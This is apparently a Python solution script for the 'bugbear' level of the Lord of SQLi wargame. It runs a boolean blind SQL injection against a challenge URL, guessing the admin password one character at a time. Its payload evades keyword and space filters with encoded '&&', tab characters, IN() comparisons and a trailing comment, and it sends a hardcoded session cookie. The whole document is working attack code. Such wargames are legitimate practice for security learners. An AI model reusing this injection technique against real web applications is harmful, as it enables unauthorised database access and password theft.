import requests
import string

char = string.printable
url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
header = {'Cookie':'PHPSESSID=m71i19igi78valu1kj9kccu53j'}
session = requests.Session()
pw = ''

for i in range(1,16):
    for c in char: 
        temp = pw + c
        param = f'no=1||true%26%26id%09in("admin")%26%26left(pw,{i})%09IN("{temp}")--%09-'
        print(param)
        r = session.get(url = url , params = param , headers = header )
        if "Hello admin" in r.text:
            pw += c
            print(pw)
            break
